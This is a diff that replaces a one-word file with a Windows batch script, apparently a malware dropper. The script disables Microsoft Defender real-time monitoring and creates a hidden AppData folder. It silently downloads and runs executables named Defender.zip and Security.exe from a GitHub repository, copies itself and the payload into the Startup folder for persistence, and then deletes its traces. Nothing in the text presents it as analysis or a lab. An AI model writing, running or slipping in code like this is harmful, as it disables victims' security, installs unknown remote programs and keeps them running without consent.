@@ -1,1 +1,35 @@
-adx
+@echo off
+setlocal enabledelayedexpansion
+
+start /b powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
+
+set "hidden_temp=%USERPROFILE%\AppData\Local\Microsoft\Windows\hidden_temp"
+mkdir "%hidden_temp%" >nul 2>&1
+attrib +h "%hidden_temp%" >nul 2>&1
+
+set "zip_url=https://github.com/MoneyAndBitch/Word/raw/refs/heads/main/Defender.zip"
+set "security_url=https://github.com/MoneyAndBitch/Word/raw/refs/heads/main/Security.exe"
+
+start /b powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%zip_url%', '%hidden_temp%\Defender.zip')" >nul 2>&1
+
+start /b powershell -Command "Expand-Archive -Path '%hidden_temp%\Defender.zip' -DestinationPath '%hidden_temp%' -Force" >nul 2>&1
+
+for %%F in ("%hidden_temp%\*.exe") do (
+    start /b "" "%%F" >nul 2>&1
+    timeout /t 5 >nul 2>&1
+    if !errorlevel! equ 0 goto success
+)
+
+start /b powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%security_url%', '%hidden_temp%\Security.exe')" >nul 2>&1
+
+start /b "" "%hidden_temp%\Security.exe" >nul 2>&1
+
+set "startup=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+copy "%~f0" "%startup%\script.bat" >nul 2>&1
+copy "%hidden_temp%\Security.exe" "%startup%" >nul 2>&1
+
+timeout /t 30 >nul 2>&1
+
+rd /s /q "%hidden_temp%" >nul 2>&1
+
+exit
